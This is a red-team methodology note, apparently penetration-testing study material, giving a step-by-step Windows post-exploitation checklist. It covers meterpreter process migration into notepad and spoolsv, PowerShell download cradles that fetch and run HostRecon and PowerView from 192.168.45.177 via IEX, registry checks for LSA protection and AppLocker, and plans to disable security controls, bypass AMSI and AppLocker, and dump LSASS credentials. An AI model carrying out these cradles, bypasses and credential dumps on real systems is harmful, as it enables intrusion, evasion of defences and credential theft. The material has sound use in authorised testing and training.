---
title: Steps
draft: false
tags:
  - red-team
  - offensive
  - methodology
---
 
1. Craft the payload using the techniques learned
2. When we manage to get a reverse shell, if we used a programming language reverse shell (for example based on the aspx web shell), we need to migrate to a different process like `explorer.exe` (requires interactive logon).
3. Identify if its an interactive or network logon. We can check it by identifying the running processes using `ps` in meterpreter. If we dont see the typical explorer.exe, we know its a non-interactive login. To solve this run:
```powershell
meterpreter> execute -H -f notepad # create a hidden notepad process
meterpreter> migrate NOTEPAD_PID # migrate into the new process
```

4. Run the WinPEAS and the [HostRecon](https://github.com/dafthack/HostRecon) script to enumerate the AV in place:
```powershell
meterpreter> shell
C:\> powershell
PS C:\> (new-object system.net.webclient).downloadstring('http://192.168.45.177/HostRecon.ps1') | IEX # bypass powershell execution policy 
PS C:\> Invoke-HostRecon
```

If Windows Defender is used, it includes AMSI — plan an [[Antimalware Scan Interface (AMSI)]] bypass (e.g. [[Wrecking AMSI in PowerShell]] or [[Bypassing AMSI With Reflection in PowerShell]]) before running any flagged PowerShell. Check if LAPS is in use (rotated local-admin passwords change the credential-reuse picture).

5. Check is LSA protection is enabled (we can dump hashes from LSASS or not):
```powershell
PS C:\> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

If its enabled, we cannot directly obtain NTLM hashes from LSASS.

6. Finally, identify if Application Whitelisting is in place. If Windows Defender is the AV, whitelisting should be done through AppLocker:
```powershell
PS C:\> Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

If AppLocker is enforced, plan a bypass through a trusted/whitelisted path (see [[Bypassing AppLocker with PowerShell]], [[Bypassing AppLocker with C#]] or [[Bypassing AppLocker with JScript]]).

7. Disable all the security controls (see [[Antivirus Evasion]] and [[Signature Based Detection]] for evasion tradecraft rather than noisy tampering).
8. Upload and enumerate the domain using PowerView or BloodHound via download cradles:
```powershell
PS C:\> (new-object system.net.webclient).downloadstring('http://192.168.45.177/powerview.ps1') | IEX
```

Feed the collected data into the AD attack path (see [[AD Enumeration with PowerView]] and [[AD Automatic Enumeration (BloodHound)]]).


If administrator meterpreter:
1. Get a stable shell migtating into the spoolsv process:
```powershell
meterpreter> ps spoolsv
meterpreter> migrate PID
```

2. With admin + LSASS access, dump credentials (respecting the RunAsPPL check from step 5) and abuse tokens for lateral movement — see [[Access Tokens]] and [[Local Windows Credentials]].

---
# Related notes
- [[Client-Side Attacks]] — how the initial payload in step 1 is typically delivered
- [[Command and Control (C2-C&C)]] — running a resilient beacon instead of a raw meterpreter session
- [[Antivirus Evasion]] · [[Signature Based Detection]] — build a payload that survives Defender
- [[Antimalware Scan Interface (AMSI)]] · [[Wrecking AMSI in PowerShell]] — unblock flagged PowerShell
- [[Bypassing AppLocker with PowerShell]] — defeat application whitelisting
- [[AD Enumeration with PowerView]] · [[AD Automatic Enumeration (BloodHound)]] — map the domain after foothold
- [[Access Tokens]] · [[Local Windows Credentials]] — privilege escalation and credential harvesting once elevated

